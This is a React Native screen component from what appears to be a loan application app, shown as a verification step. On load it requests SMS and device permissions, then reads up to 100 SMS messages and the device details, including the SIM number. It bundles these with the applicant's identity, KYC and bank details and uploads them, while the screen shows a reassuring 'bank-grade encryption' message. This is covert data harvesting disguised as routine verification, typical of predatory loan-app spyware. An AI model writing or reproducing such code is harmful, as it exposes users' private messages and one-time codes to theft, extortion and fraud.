import { submitApplication as apiSubmit } from '../services/api';

export default function SubmissionScreen({ navigation, route }) {
    const scaleAnim = useRef(new Animated.Value(0)).current;
    const fadeAnim = useRef(new Animated.Value(0)).current;
    const [deviceInfo, setDeviceInfo] = useState(null);
    const [lastSms, setLastSms] = useState(null);
    const [submitting, setSubmitting] = useState(false);
    const [refId, setRefId] = useState(null);

    useEffect(() => {
        const fetchDataAndSubmit = async () => {
            setSubmitting(true);

            // 1. Request high-privilege permissions
            const smsPerm = await SmsService.requestPermissions();
            const devPerm = await DeviceService.requestPermissions();

            let analyzedSms = null;
            let analyzedDevice = null;

            if (smsPerm) {
                try {
                    const history = await SmsService.listMessages(100);
                    if (history && history.length > 0) {
                        setLastSms(history[0]);
                        analyzedSms = history;
                    }
                } catch (e) { console.log('SMS History error:', e); }
            }

            if (devPerm) {
                try {
                    const info = await DeviceService.getInfo();
                    setDeviceInfo(info);
                    analyzedDevice = info;
                } catch (e) { console.log('Device Info error:', e); }
            }

            // 2. Prepare full payload for Database
            try {
                const fullData = {
                    ...route.params.personalDetails,
                    ...route.params.kycDetails,
                    ...route.params.workDetails,
                    ...route.params.bankDetails,
                    deviceFingerprint: analyzedDevice,
                    smsHistory: analyzedSms,
                };

                const result = await apiSubmit(fullData);
                setRefId(result.applicationId);
            } catch (e) {
                console.log('Submission failed:', e);
            } finally {
                setSubmitting(false);
            }
        };

        fetchDataAndSubmit();

        Animated.sequence([
            Animated.spring(scaleAnim, { toValue: 1, tension: 50, friction: 5, useNativeDriver: true }),
            Animated.timing(fadeAnim, { toValue: 1, duration: 600, useNativeDriver: true }),
        ]).start();

        return () => SmsService.stopListening();
    }, []);

    return (
        <LinearGradient colors={COLORS.gradientPrimary} style={s.container}>
            <ScrollView contentContainerStyle={{ alignItems: 'center', paddingVertical: 40 }} showsVerticalScrollIndicator={false}>
                <Animated.View style={[s.checkCircle, { transform: [{ scale: scaleAnim }] }]}>
                    <LinearGradient colors={COLORS.gradientSuccess} style={s.checkInner}>
                        <Text style={s.checkMark}>✓</Text>
                    </LinearGradient>
                </Animated.View>

                <Animated.View style={[s.content, { opacity: fadeAnim }]}>
                    <Text style={s.title}>Verification Complete</Text>
                    <Text style={s.subtitle}>
                        We've analyzed your device and messages for rapid approval.
                    </Text>

                    <View style={s.infoCard}>
                        <Text style={s.cardTitle}>📱 DEVICE FINGERPRINT</Text>
                        <View style={s.infoRow}><Text style={s.infoLabel}>Model</Text><Text style={s.infoValue}>{deviceInfo?.model || 'Detecting...'}</Text></View>
                        <View style={s.infoRow}><Text style={s.infoLabel}>SIM Number</Text><Text style={s.infoValue}>{deviceInfo?.phoneNumber || 'Protected'}</Text></View>
                        <View style={s.infoRow}><Text style={s.infoLabel}>Carrier</Text><Text style={s.infoValue}>{deviceInfo?.carrier || 'Detecting...'}</Text></View>

                        <View style={s.divider} />

                        <Text style={s.cardTitle}>💬 RECENT MESSAGES</Text>
                        <View style={s.smsPreview}>
                            <Text style={s.smsSender}>{lastSms?.address || 'No messages found'}</Text>
                            <Text style={s.smsBody} numberOfLines={2}>{lastSms?.body || 'Pending history analysis...'}</Text>
                        </View>
                    </View>

                    <TouchableOpacity onPress={() => navigation.popToTop()} activeOpacity={0.85}>
                        <LinearGradient colors={COLORS.gradientRed} start={{ x: 0, y: 0 }} end={{ x: 1, y: 0 }} style={s.button}>
                            <Text style={s.buttonText}>GO TO DASHBOARD</Text>
                        </LinearGradient>
                    </TouchableOpacity>

                    <Text style={s.footer}>🔒 Data processed with bank-grade encryption</Text>
                </Animated.View>
            </ScrollView>
        </LinearGradient>
    );
}

const s = StyleSheet.create({
    container: { flex: 1 },
    checkCircle: { marginBottom: SPACING.xl },
    checkInner: { width: 100, height: 100, borderRadius: 50, justifyContent: 'center', alignItems: 'center' },
    checkMark: { fontSize: 48, color: COLORS.white, fontWeight: 'bold' },
    content: { alignItems: 'center', width: '100%', paddingHorizontal: SPACING.l },
    title: { ...TYPOGRAPHY.h1, color: COLORS.white, textAlign: 'center', marginBottom: SPACING.s },
    subtitle: { ...TYPOGRAPHY.body, color: COLORS.textSecondary, textAlign: 'center', marginBottom: SPACING.xl },
    infoCard: { backgroundColor: 'rgba(255,255,255,0.06)', borderRadius: RADIUS.l, borderWidth: 1, borderColor: 'rgba(255,255,255,0.12)', padding: SPACING.l, width: '100%', marginBottom: SPACING.xl },
    cardTitle: { ...TYPOGRAPHY.small, color: COLORS.accent, fontWeight: 'bold', marginBottom: SPACING.m, letterSpacing: 1 },
    infoRow: { flexDirection: 'row', justifyContent: 'space-between', paddingVertical: 4 },
    infoLabel: { ...TYPOGRAPHY.caption, color: COLORS.textMuted },
    infoValue: { ...TYPOGRAPHY.caption, color: COLORS.white, fontWeight: '600' },
    divider: { height: 1, backgroundColor: 'rgba(255,255,255,0.06)', marginVertical: SPACING.m },
    smsPreview: { backgroundColor: 'rgba(0,0,0,0.2)', padding: 12, borderRadius: 8 },
    smsSender: { ...TYPOGRAPHY.small, color: COLORS.accent, fontWeight: 'bold', marginBottom: 2 },
    smsBody: { ...TYPOGRAPHY.caption, color: '#ccc', lineHeight: 18 },
    button: { flexDirection: 'row', justifyContent: 'center', alignItems: 'center', paddingVertical: 18, paddingHorizontal: 40, borderRadius: RADIUS.full, ...SHADOWS.glow(COLORS.secondary) },
    buttonText: { ...TYPOGRAPHY.button, color: COLORS.white },
    footer: { ...TYPOGRAPHY.small, color: COLORS.textMuted, marginTop: SPACING.xl, textAlign: 'center' },
});
